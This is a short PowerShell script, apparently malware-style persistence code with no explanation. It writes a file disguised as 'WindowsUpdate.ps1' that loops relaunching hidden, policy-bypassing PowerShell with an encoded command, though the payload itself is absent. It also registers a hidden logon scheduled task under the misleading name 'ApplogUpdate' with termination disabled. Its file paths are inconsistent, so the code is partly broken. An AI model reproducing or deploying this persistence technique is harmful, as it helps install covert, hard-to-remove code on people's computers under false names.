$go = 'powershell.exe -ep bypass -noexit -windowstyle Hidden -nop  -Encoded '
New-Item -Path "C:\Program Files (x86)\WindowsPowerShell\Modules\" -Name "WindowsUpdate.ps1" -Value '
$Update=0
do{
    if (!(Get-Process -Name powershell.exe -ErrorAction SilentlyContinue))
    { $go
           Sleep 2
    }
    $go
     Sleep 2
}until ($Update -eq 1)' -Force
Start-Process powershell.exe -Args 'C:\Users\hurik\AppData\Roaming\WindowsUpdate.ps1'
$A = New-ScheduledTaskAction -Execute "C:\Program Files (x86)\WindowsPowerShell\Modules\WindowsUpdate.ps1"
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument '-NoProfile -WindowStyle Hidden -command "powershell.exe -windowstyle Hidden -nop -ep bypass -noexit -file "C:\Users\hurik\Documents\WindowsUpdate.ps1""'
$trigger =  New-ScheduledTaskTrigger -AtLogOn
$settings = New-ScheduledTaskSettingsSet -Hidden -RunOnlyIfNetworkAvailable -StartWhenAvailable -Priority 5  -DontStopIfGoingOnBatteries -AllowStartIfOnBatteries -DisallowHardTerminate
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "ApplogUpdate" -Description "Daily dump of Applog" -Settings $settings -Force